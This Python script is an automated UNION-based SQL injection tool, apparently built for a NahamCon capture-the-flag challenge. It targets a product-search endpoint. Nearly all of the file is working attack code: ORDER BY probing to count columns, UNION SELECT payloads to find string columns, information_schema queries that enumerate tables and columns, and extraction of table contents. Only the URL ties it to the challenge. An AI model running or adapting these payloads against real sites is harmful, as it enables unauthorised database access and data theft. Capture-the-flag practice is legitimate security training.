import requests
import time
import re

# Configuration
BASE_URL = "http://challenge.nahamcon.com:30640"
ENDPOINT = "/sku_search.php"
FULL_URL = BASE_URL + ENDPOINT

# Session cookie - will be automatically replaced during execution
# Use placeholder for now, actual cookie will be provided by context
# SESSION_COOKIE = "session=your_session_here"

# Use dummy value - this will be replaced by the system
SESSION_COOKIE = "session=<dummy_session>"

def send_post(payload):
    """Send POST request with given payload"""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Add cookie if available
    if SESSION_COOKIE and SESSION_COOKIE != "session=<dummy_session>":
        headers["Cookie"] = SESSION_COOKIE
    
    data = {"search": payload}
    
    try:
        response = requests.post(FULL_URL, data=data, headers=headers, timeout=15)
        return response
    except Exception as e:
        print(f"[!] Error sending request: {e}")
        return None

def find_column_count():
    """Step 1: Find column count using ORDER BY"""
    print("=" * 80)
    print("[*] STEP 1: Finding column count using ORDER BY")
    print("=" * 80)
    print(f"[*] Testing up to 20 columns...\n")
    
    for i in range(1, 21):
        payload = f"test' ORDER BY {i}-- "
        print(f"  Testing: ORDER BY {i:2d} | ", end="")
        
        response = send_post(payload)
        if response is None:
            print("Request failed")
            continue
            
        # Check if response contains SQL error
        if "SQL syntax" in response.text or "mysql" in response.text.lower() or "error" in response.text.lower():
            if i > 1:
                column_count = i - 1
                print(f"SQL ERROR DETECTED")
                print(f"\n[+] COLUMN COUNT FOUND: {column_count} columns")
                print(f"    Last successful: ORDER BY {column_count}")
                print(f"    Failed at: ORDER BY {i}")
                return column_count
            else:
                print(f"Error at first column - unusual")
                return None
        else:
            print(f"OK (Status: {response.status_code})")
        
        time.sleep(0.1)
    
    print("\n[-] Could not determine column count within test range (1-20)")
    return None

def find_string_columns(column_count):
    """Step 2: Find which columns accept string data"""
    print("\n" + "=" * 80)
    print("[*] STEP 2: Finding string-compatible columns")
    print("=" * 80)
    print(f"[*] Testing {column_count} columns for string compatibility...\n")
    
    string_columns = []
    
    for i in range(1, column_count + 1):
        # Build UNION SELECT with 'test_string' in position i
        nulls = ["NULL"] * column_count
        nulls[i-1] = "'test_string'"  # Replace NULL with string in position i
        union_payload = f"test' UNION SELECT {','.join(nulls)}-- "
        
        print(f"  Testing column {i}: UNION SELECT {'test_string' if i==1 else 'NULL'}...", end="")
        
        response = send_post(union_payload)
        if response is None:
            print(" Request failed")
            continue
        
        # Check if response contains our test string
        if "test_string" in response.text:
            print(f" ✓ STRING COMPATIBLE (Length: {len(response.text)}B)")
            string_columns.append(i)
        elif "SQL syntax" in response.text.lower() or "error" in response.text.lower():
            print(f" ✗ Not string compatible (SQL error)")
        else:
            print(f" ? Unknown (Status: {response.status_code}, Size: {len(response.text)}B)")
        
        time.sleep(0.1)
    
    
    print(f"\n[+] STRING-COMPATIBLE COLUMNS: {string_columns if string_columns else 'None found'}")
    return string_columns

def enumerate_database(column_count, string_columns):
    """Step 3: Enumerate database information"""
    print("\n" + "=" * 80)
    print("[*] STEP 3: Enumerating database")
    print("=" * 80)
    
    if not string_columns:
        print("[-] No string columns available for enumeration")
        return False
    
    # Use first string column for data extraction
    str_col = string_columns[0]
    
    # Build base UNION SELECT query
    base_nulls = ["NULL"] * column_count
    base_nulls[str_col-1] = "{data}"
    base_query = f"test' UNION SELECT {','.join(base_nulls)}-- "
    
    print(f"[*] Using column {str_col} for data extraction\n")
    
    # Get database version
    print("[1] Database version:")
    version_payload = base_query.format(data="@@version")
    response = send_post(version_payload)
    if response and response.status_code == 200:
        # Extract version from response (look for version-like pattern)
        print(f"    Response length: {len(response.text)}B")
        print(f"    Full response:\n{response.text}")
    else:
        print("    Failed to get version")
    
    # Get current database name
    print("\n[2] Current database name:")
    db_payload = base_query.format(data="database()")
    response = send_post(db_payload)
    if response and response.status_code == 200:
        print(f"    Response length: {len(response.text)}B")
        print(f"    Full response:\n{response.text}")
    else:
        print("    Failed to get database name")
    
    # Get all tables
    print("\n[3] All tables in current database:")
    tables_payload = base_query.format(data="(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())")
    response = send_post(tables_payload)
    if response and response.status_code == 200:
        print(f"    Response length: {len(response.text)}B")
        print(f"    Full response:\n{response.text}")
    else:
        print("    Failed to get tables")
    
    # Get specific tables containing 'flag'
    print("\n[4] Tables containing 'flag':")
    flag_tables_payload = base_query.format(data="(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%flag%')")
    response = send_post(flag_tables_payload)
    if response and response.status_code == 200:
        print(f"    Response length: {len(response.text)}B")
        print(f"    Full response:\n{response.text}")
        
        # Check if we found any flag tables
        if "flag" in response.text.lower():
            print("\n[!] POTENTIAL FLAG TABLES FOUND!")
            # Extract table names using regex
            tables_match = re.findall(r'([a-zA-Z0-9_]*flag[a-zA-Z0-9_]*)', response.text, re.I)
            if tables_match:
                print(f"    Flag-related tables: {list(set(tables_match))}")
                return list(set(tables_match))
    else:
        print("    Failed to find flag tables")
    
    return None

def extract_flag_data(column_count, string_columns, flag_tables):
    """Step 4: Extract flag data from suspicious tables"""
    if not flag_tables or not string_columns:
        print("[-] Cannot extract flag data - missing tables or string columns")
        return False
    
    print("\n" + "=" * 80)
    print("[*] STEP 4: Extracting flag data")
    print("=" * 80)
    
    str_col = string_columns[0]
    base_nulls = ["NULL"] * column_count
    base_nulls[str_col-1] = "{data}"
    base_query = f"test' UNION SELECT {','.join(base_nulls)}-- "
    
    for table in flag_tables:
        print(f"\n[*] Enumerating table: {table}")
        
        # Get column names
        print(f"  [a] Columns in {table}:")
        columns_payload = base_query.format(data=f"(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}')")
        response = send_post(columns_payload)
        if response and response.status_code == 200:
            print(f"      Response length: {len(response.text)}B")
            print(f"      Response:\n{response.text}")
            columns = re.findall(r'([a-zA-Z0-9_]+)', response.text)
            print(f"      Extracted columns: {columns}")
        else:
            print(f"      Failed to get columns")
            continue
        
        # Extract all data from table
        print(f"  [b] Data from {table}:")
        data_payload = base_query.format(data=f"(SELECT group_concat(*) FROM {table})")
        try:
            response = send_post(data_payload)
            if response and response.status_code == 200:
                print(f"      Response length: {len(response.text)}B")
                print(f"      Response:\n{response.text}")
                
                # Look for FLAG pattern
                flag_match = re.findall(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    print(f"\n[!] FLAGS FOUND: {flag_match}")
                    return True
            else:
                print(f"      Failed to extract data (status: {response.status_code if response else 'None'})")
        except:
            print(f"      Error extracting data - trying alternative approach")
            
            # Try a simple SELECT
            simple_payload = base_query.format(data=f"(SELECT * FROM {table} LIMIT 1)")
            try:
                response = send_post(simple_payload)
                if response and response.status_code == 200:
                    print(f"      Simple query response:\n{response.text}")
            except:
                print(f"      Alternative approach also failed")
        
        time.sleep(0.2)
    
    return False

def main():
    """Main enumeration function"""
    print("=" * 80)
    print("SQL INJECTION ENUMERATION TOOL")
    print(f"Target: {FULL_URL}")
    print("=" * 80)
    
    # Step 1: Find column count
    column_count = find_column_count()
    if not column_count:
        print("\n[-] Failed to determine column count. Exiting.")
        return
    
    # Step 2: Find string columns
    string_columns = find_string_columns(column_count)
    if not string_columns:
        print("\n[-] No string columns found. Cannot proceed with enumeration.")
        return
    
    # Step 3: Enumerate database
    flag_tables = enumerate_database(column_count, string_columns)
    
    # Step 4: Extract flag data if tables found
    if flag_tables:
        success = extract_flag_data(column_count, string_columns, flag_tables)
        if success:
            print("\n[+] FLAG EXTRACTION COMPLETE!")
        else:
            print("\n[-] Could not extract flag from identified tables")
    else:
        print("\n[-] No flag-related tables found")
        
        # Alternative: Try to extract from all tables
        print("\n[*] Attempting to enumerate ALL tables for flag...")
        str_col = string_columns[0]
        base_nulls = ["NULL"] * column_count
        base_nulls[str_col-1] = "{data}"
        base_query = f"test' UNION SELECT {','.join(base_nulls)}-- "
        
        tables_payload = base_query.format(data="(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())")
        response = send_post(tables_payload)
        if response and response.status_code == 200:
            print(f"    All tables response:\n{response.text}")
            print("\n[*] Manual review needed - check response for table names")
    
    print("\n" + "=" * 80)
    print("ENUMERATION COMPLETE")
    print("=" * 80)

if __name__ == "__main__":
    main()
